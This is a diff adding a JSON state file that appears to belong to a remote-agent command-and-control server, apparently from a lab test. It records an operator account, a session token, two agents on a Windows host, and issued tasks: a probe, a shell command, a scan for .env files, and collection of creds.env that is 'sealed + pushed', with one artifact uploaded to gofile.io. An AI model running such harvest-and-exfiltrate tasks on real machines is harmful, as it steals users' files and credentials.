@@ -1,0 +1,384 @@
+{
+ "secret": "3b5f2abad0ffa38645c2a4aedf76f283f8fae876bcfb8a2d0b01bdb98eca04fe",
+ "operators": [
+  {
+   "email": "op@lab.local",
+   "phash": "80fa63f14a666a1a7d1521882b024e32:421c6e219bb9b4f11657897cbea179e1a6cbe0ac4586cfa15b130d6c3b1bb111c84416d1fb05bb78ee642d574e04f7035ac7106aeee87296a624719849b2baf8",
+   "role": "admin",
+   "created": "2026-11-20T19:13:43.155Z"
+  }
+ ],
+ "sessions": {
+  "9c67f13cbc06d22d758f4df1fed1f2443aa304de5dc11011": {
+   "email": "op@lab.local",
+   "exp": 1795806823242
+  }
+ },
+ "agents": {
+  "cl-argon-770f": {
+   "id": "cl-argon-770f",
+   "firstSeen": "2026-11-20T19:15:36.499Z",
+   "lastSeen": "2026-11-20T19:17:10.727Z",
+   "profile": {
+    "os": "win32",
+    "osVersion": "10.0.26300",
+    "arch": "x64",
+    "host": "ValidBypass",
+    "user": "sgoli",
+    "cwd": "C:\\temp\\chlorum-35",
+    "runtime": "node v26.13.1",
+    "bootAt": "2026-11-20T19:17:10.695Z"
+   },
+   "stats": {
+    "logs": 4,
+    "tasksDone": 0,
+    "bytes": 241
+   }
+  },
+  "cl-iodine-c096": {
+   "id": "cl-iodine-c096",
+   "firstSeen": "2026-11-20T20:50:16.641Z",
+   "lastSeen": "2026-11-20T20:53:01.324Z",
+   "profile": {
+    "os": "win32",
+    "osVersion": "10.0.26300",
+    "arch": "x64",
+    "host": "ValidBypass",
+    "user": "sgoli",
+    "cwd": "C:\\temp\\chlorum-35",
+    "runtime": "node v26.13.1",
+    "bootAt": "",
+    "uptime": 10094,
+    "cpus": 16,
+    "memTotal": 16786370560
+   },
+   "stats": {
+    "logs": 14,
+    "tasksDone": 5,
+    "bytes": 641
+   }
+  }
+ },
+ "tasks": {
+  "cl-iodine-c096": [
+   {
+    "id": "bfa9d991",
+    "type": "probe",
+    "args": {},
+    "issued": "2026-11-20T20:50:27.989Z",
+    "state": "done",
+    "result": {
+     "summary": "probe",
+     "profile": {
+      "os": "win32",
+      "osVersion": "10.0.26300",
+      "arch": "x64",
+      "host": "ValidBypass",
+      "user": "sgoli",
+      "uptime": 10094,
+      "cpus": 16,
+      "memTotal": 16786370560,
+      "cwd": "C:\\temp\\chlorum-35",
+      "runtime": "node v26.13.1"
+     }
+    }
+   },
+   {
+    "id": "333b4d64",
+    "type": "shell",
+    "args": {
+     "cmd": "whoami && cd",
+     "timeout": 30000
+    },
+    "issued": "2026-11-20T20:50:28.016Z",
+    "state": "done",
+    "result": {
+     "summary": "shell: whoami && cd",
+     "code": 0,
+     "stdout": "sgoli\nC:\\temp\\chlorum-35\r\n",
+     "stderr": ""
+    }
+   },
+   {
+    "id": "cd856bc9",
+    "type": "scan",
+    "args": {
+     "root": "C:\\temp\\chl-e2e",
+     "ext": [
+      ".txt",
+      ".env",
+      ".bin"
+     ],
+     "limit": 500
+    },
+    "issued": "2026-11-20T20:51:42.472Z",
+    "state": "done",
+    "result": {
+     "summary": "scan C:\\temp\\chl-e2e: 3 hits / 5 visited",
+     "matches": [
+      {
+       "path": "C:\\temp\\chl-e2e\\blob.bin",
+       "size": 19
+      },
+      {
+       "path": "C:\\temp\\chl-e2e\\creds.env",
+       "size": 21
+      },
+      {
+       "path": "C:\\temp\\chl-e2e\\notes.txt",
+       "size": 28
+      }
+     ]
+    }
+   },
+   {
+    "id": "2aa8ec43",
+    "type": "collect",
+    "args": {
+     "paths": [
+      "C:\\temp\\chl-e2e\\notes.txt",
+      "C:\\temp\\chl-e2e\\creds.env",
+      "C:\\temp\\chl-e2e\\blob.bin",
+      "C:\\temp\\chl-e2e\\missing.txt"
+     ]
+    },
+    "issued": "2026-11-20T20:51:42.490Z",
+    "state": "done",
+    "result": {
+     "summary": "collect: 3/4 sealed + pushed"
+    }
+   },
+   {
+    "id": "73b7d038",
+    "type": "collect",
+    "args": {
+     "paths": [
+      "C:\\temp\\chl-e2e\\notes.txt",
+      "C:\\temp\\chl-e2e\\creds.env",
+      "C:\\temp\\chl-e2e\\blob.bin",
+      "C:\\temp\\chl-e2e\\missing.txt"
+     ]
+    },
+    "issued": "2026-11-20T20:52:59.726Z",
+    "state": "done",
+    "result": {
+     "summary": "collect: 3/4 sealed + pushed",
+     "manifest": [
+      {
+       "path": "C:\\temp\\chl-e2e\\notes.txt",
+       "size": 28,
+       "digest": "f46554905b09",
+       "encoding": "utf8"
+      },
+      {
+       "path": "C:\\temp\\chl-e2e\\creds.env",
+       "size": 21,
+       "digest": "e85d326eed8e",
+       "encoding": "utf8"
+      },
+      {
+       "path": "C:\\temp\\chl-e2e\\blob.bin",
+       "size": 19,
+       "digest": "5642f254b395",
+       "encoding": "base64"
+      },
+      {
+       "path": "C:\\temp\\chl-e2e\\missing.txt",
+       "note": "not found"
+      }
+     ]
+    }
+   }
+  ]
+ },
+ "logs": [
+  {
+   "seq": 1,
+   "agentId": "cl-argon-770f",
+   "ts": "2026-11-20T19:15:36.501Z",
+   "kind": "node",
+   "severity": "info",
+   "text": "node registered: unknown"
+  },
+  {
+   "seq": 2,
+   "agentId": "cl-argon-770f",
+   "ts": "2026-11-20T19:16:28.959Z",
+   "kind": "node",
+   "severity": "info",
+   "text": "node registered: ValidBypass"
+  },
+  {
+   "seq": 3,
+   "agentId": "cl-argon-770f",
+   "ts": "2026-11-20T19:17:10.729Z",
+   "kind": "node",
+   "severity": "info",
+   "text": "node registered: ValidBypass"
+  },
+  {
+   "seq": 4,
+   "agentId": "cl-argon-770f",
+   "ts": "2026-11-20T19:17:12.732Z",
+   "kind": "vault",
+   "severity": "info",
+   "text": "sealed cl-argon-770f-1795202230877-hypochlorite-1795202230874.txt.chl (241 bytes) + archived"
+  },
+  {
+   "seq": 5,
+   "agentId": "cl-iodine-c096",
+   "ts": "2026-11-20T20:50:16.644Z",
+   "kind": "node",
+   "severity": "info",
+   "text": "node registered: ValidBypass"
+  },
+  {
+   "seq": 6,
+   "agentId": "cl-iodine-c096",
+   "ts": "2026-11-20T20:50:16.792Z",
+   "kind": "vault",
+   "severity": "info",
+   "text": "sealed cl-iodine-c096-1795207816746-hypochlorite-1795207816745.txt.chl (155 bytes)"
+  },
+  {
+   "seq": 7,
+   "agentId": "cl-iodine-c096",
+   "ts": "2026-11-20T20:50:27.990Z",
+   "kind": "task",
+   "severity": "info",
+   "text": "injected probe task bfa9d991"
+  },
+  {
+   "seq": 8,
+   "agentId": "cl-iodine-c096",
+   "ts": "2026-11-20T20:50:28.018Z",
+   "kind": "task",
+   "severity": "info",
+   "text": "injected shell task 333b4d64"
+  },
+  {
+   "seq": 9,
+   "agentId": "cl-iodine-c096",
+   "ts": "2026-11-20T20:50:29.293Z",
+   "kind": "task",
+   "severity": "info",
+   "text": "task bfa9d991 done: probe"
+  },
+  {
+   "seq": 10,
+   "agentId": "cl-iodine-c096",
+   "ts": "2026-11-20T20:50:29.343Z",
+   "kind": "task",
+   "severity": "info",
+   "text": "task 333b4d64 done: shell: whoami && cd"
+  },
+  {
+   "seq": 11,
+   "agentId": "cl-iodine-c096",
+   "ts": "2026-11-20T20:51:42.474Z",
+   "kind": "task",
+   "severity": "info",
+   "text": "injected scan task cd856bc9"
+  },
+  {
+   "seq": 12,
+   "agentId": "cl-iodine-c096",
+   "ts": "2026-11-20T20:51:42.492Z",
+   "kind": "task",
+   "severity": "info",
+   "text": "injected collect task 2aa8ec43"
+  },
+  {
+   "seq": 13,
+   "agentId": "cl-iodine-c096",
+   "ts": "2026-11-20T20:51:43.717Z",
+   "kind": "task",
+   "severity": "info",
+   "text": "task cd856bc9 done: scan C:\\temp\\chl-e2e: 3 hits / 5 visited"
+  },
+  {
+   "seq": 14,
+   "agentId": "cl-iodine-c096",
+   "ts": "2026-11-20T20:51:43.892Z",
+   "kind": "vault",
+   "severity": "info",
+   "text": "sealed cl-iodine-c096-1795207903846-collect-1795207903846.txt.chl (243 bytes)"
+  },
+  {
+   "seq": 15,
+   "agentId": "cl-iodine-c096",
+   "ts": "2026-11-20T20:51:43.895Z",
+   "kind": "task",
+   "severity": "info",
+   "text": "task 2aa8ec43 done: collect: 3/4 sealed + pushed"
+  },
+  {
+   "seq": 16,
+   "agentId": "cl-iodine-c096",
+   "ts": "2026-11-20T20:52:59.727Z",
+   "kind": "task",
+   "severity": "info",
+   "text": "injected collect task 73b7d038"
+  },
+  {
+   "seq": 17,
+   "agentId": "cl-iodine-c096",
+   "ts": "2026-11-20T20:53:01.321Z",
+   "kind": "vault",
+   "severity": "info",
+   "text": "sealed cl-iodine-c096-1795207981276-collect-1795207981274.txt.chl (243 bytes)"
+  },
+  {
+   "seq": 18,
+   "agentId": "cl-iodine-c096",
+   "ts": "2026-11-20T20:53:01.325Z",
+   "kind": "task",
+   "severity": "info",
+   "text": "task 73b7d038 done: collect: 3/4 sealed + pushed"
+  }
+ ],
+ "artifacts": [
+  {
+   "agentId": "cl-argon-770f",
+   "name": "cl-argon-770f-1795202230877-hypochlorite-1795202230874.txt.chl",
+   "bytes": 241,
+   "kind": "hypochlorite",
+   "at": "2026-11-20T19:17:10.923Z",
+   "archive": null
+  },
+  {
+   "agentId": "cl-iodine-c096",
+   "name": "cl-iodine-c096-1795207816746-hypochlorite-1795207816745.txt.chl",
+   "bytes": 155,
+   "kind": "hypochlorite",
+   "at": "2026-11-20T20:50:16.790Z",
+   "archive": null
+  },
+  {
+   "agentId": "cl-iodine-c096",
+   "name": "cl-iodine-c096-1795207903846-collect-1795207903846.txt.chl",
+   "bytes": 243,
+   "kind": "collect",
+   "at": "2026-11-20T20:51:43.890Z",
+   "archive": null
+  },
+  {
+   "agentId": "cl-iodine-c096",
+   "name": "cl-iodine-c096-1795207981276-collect-1795207981274.txt.chl",
+   "bytes": 243,
+   "kind": "collect",
+   "at": "2026-11-20T20:53:01.320Z",
+   "archive": null
+  }
+ ],
+ "gofile": [
+  {
+   "at": "2026-11-20T19:17:12.731Z",
+   "code": "HiBgOrQD",
+   "downloadPage": "https://gofile.io/d/8PqE73HJ",
+   "name": "cl-argon-770f-1795202230877-hypochlorite-1795202230874.txt.chl",
+   "size": 241
+  }
+ ],
+ "seq": 18
+}
